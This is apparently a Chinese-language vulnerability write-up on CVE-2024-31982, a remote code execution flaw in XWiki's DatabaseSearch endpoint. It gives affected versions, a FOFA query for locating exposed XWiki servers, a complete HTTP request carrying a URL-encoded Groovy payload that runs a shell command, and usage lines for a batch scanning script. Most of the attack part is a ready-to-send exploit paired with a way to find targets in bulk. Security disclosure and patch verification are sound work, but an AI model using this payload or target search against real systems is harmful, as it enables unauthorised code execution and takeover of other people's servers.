# CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞

### 1.漏洞描述

XWiki 是一个由 Java 编写的基于 LGPL 协议发布的开源 wiki 和应用平台。它的开发平台特性允许创建协作式 Web 应用，同时也提供了构建于平台之上的打包应用。该系统/bin/get/Main/DatabaseSearch接口处存在远程代码执行漏洞，未经授权的攻击者可执行任意代码，会导致服务器失陷，请及时修复。

### 2.影响版本

XWiki平台  2.4-milestone-1及之前的版本4.10.20、15.5.4和15.10-rc-1版本

### 3.fofa语法

```plain
body="data-xwiki-reference"
```

### 4.漏洞复现

```plain
GET /bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dthrow%20new%20Exception%28%27id%27.execute%28%29.text%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719921417561-fa806925-3ad8-4db4-9f9e-99e381cd0eef.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

### 5.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```